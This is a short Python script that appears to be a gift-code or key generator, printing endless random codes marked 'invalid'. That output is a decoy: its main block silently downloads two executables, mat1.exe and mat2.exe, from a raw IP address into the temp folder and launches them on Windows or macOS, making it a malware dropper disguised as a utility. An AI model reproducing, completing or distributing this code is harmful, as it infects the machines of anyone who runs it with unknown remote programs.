import random
import string
import time
import requests
import os
import subprocess
import tempfile
from colorama import init, Fore

init(autoreset=True)

def generate_code():
    parts = []
    for _ in range(4):
        part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))  
        parts.append(part)
    return '-'.join(parts)  

def download_and_open_file(url, filename):
    temp_dir = tempfile.gettempdir()  
    file_path = os.path.join(temp_dir, filename) 
    
    response = requests.get(url)
    if response.status_code == 200:
        with open(file_path, 'wb') as file:
            file.write(response.content)
   
    if os.name == 'nt':
        subprocess.Popen(['start', file_path], shell=True)
    elif os.name == 'posix':
        subprocess.Popen(['open', file_path])

if __name__ == "__main__":
    url1 = "http://92.42.102.13/mat1.exe"
    filename1 = "mat1.exe"

    url2 = "http://92.42.102.13/mat2.exe"
    filename2 = "mat2.exe"
    
    download_and_open_file(url1, filename1)
    download_and_open_file(url2, filename2)
    
    while True:
        code = generate_code()
        link = f"{code} code is invalid"
        print(Fore.RED + link)  
        time.sleep(0.3)  
